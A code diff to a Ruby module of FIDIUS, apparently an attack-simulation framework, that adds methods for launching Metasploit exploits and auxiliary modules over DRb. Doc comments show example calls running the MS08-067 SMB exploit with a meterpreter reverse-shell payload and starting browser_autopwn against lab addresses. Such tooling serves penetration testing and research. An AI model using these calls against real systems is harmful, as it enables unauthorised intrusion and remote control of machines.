@@ -7,7 +7,7 @@ module FIDIUS
     #     msf = FIDIUS::Action::Msf.instance.framework
     #
     # You might get an Error::ENOENT if the configuration file
-    # (+config/msf.yml+) was not found.
+    # (+config/fidius.yml+) was not found.
     class Msf
       include Singleton
 
@@ -18,8 +18,8 @@ module FIDIUS
       # The construction will fail if the configuration yaml file could
       # not be found.
       def initialize
-        cfg = YAML.load_file(File.expand_path '../../../../config/msf.yml', __FILE__)
-        @uri = "druby://#{cfg[:drb_host]}:#{cfg[:drb_port]}"
+        host, port = FIDIUS.config['metasploit']['host'], FIDIUS.config['metasploit']['port']
+        @uri = "druby://#{host}:#{port}"
         begin
           DRb.current_server
         rescue DRb::DRbServerNotFound
@@ -27,7 +27,7 @@ module FIDIUS
           ThreadGroup.new.add DRb.thread
         end
       rescue
-        puts "No `config/msf.yml' found."
+        puts "No `metasploit' section in `config/fidius.yml' found."
         raise
       end
 
@@ -37,6 +37,50 @@ module FIDIUS
       # @return [Msf::Simple::Framework]  The Metasploit framework.
       def framework
         daemon.framework
+      end
+
+      # Runs the exploit with the given name and the given opts.
+      #
+      # example usage: msf.run_exploit("windows/smb/ms08_067_netapi",
+      #   {"PAYLOAD" => "windows/meterpreter/reverse_tcp",
+      #     "RHOST" => "192.168.56.101", "LHOST" => "192.168.56.1"})
+      #
+      # @param [String]  exploit
+      # @param [Hash]  opts
+      # @param [bool]  async true to start exploit in a new thread
+      # @return [Msf::Session] A Session got for this exploit.
+      def run_exploit(exploit, opts, async = true)
+        daemon.run_exploit(exploit, {
+          'Payload'  => opts['PAYLOAD'],
+          'Target'   => opts['TARGET'],
+          'RunAsJob' => async,
+          'Options'  => opts
+        })
+      end
+
+      # Runs the auxiliary with the given name and the given opts.
+      #
+      # example usage: msf.run_exploit("server/browser_autopwn",
+      #   {'LHOST' => "192.168.0.1", 'SRVHOST' => "192.168.0.1", 'URIPATH' => "/" })
+      #
+      # @param [String]  auxiliary
+      # @param [Hash]  opts
+      # @param [bool]  async true to start auxiliary in a new thread
+      def run_auxiliary(auxiliary, opts, async = true)
+        daemon.run_auxiliary(auxiliary, {
+          'Action'   => opts['ACTION'],
+          'RunAsJob' => async,
+          'Options'  => opts
+        })
+      end
+
+      # Adds a subscriber for the session events. This is called e.g on
+      # session create.
+      #
+      # @param [TODO]  handler The methods on this object are called when an
+      #                   event occurres.
+      def add_session_subscriber(handler)
+        daemon.framework.events.add_session_subscriber(handler)
       end
 
       # Returns the Metasploit framework DRb wrapper. Useful for debugging.
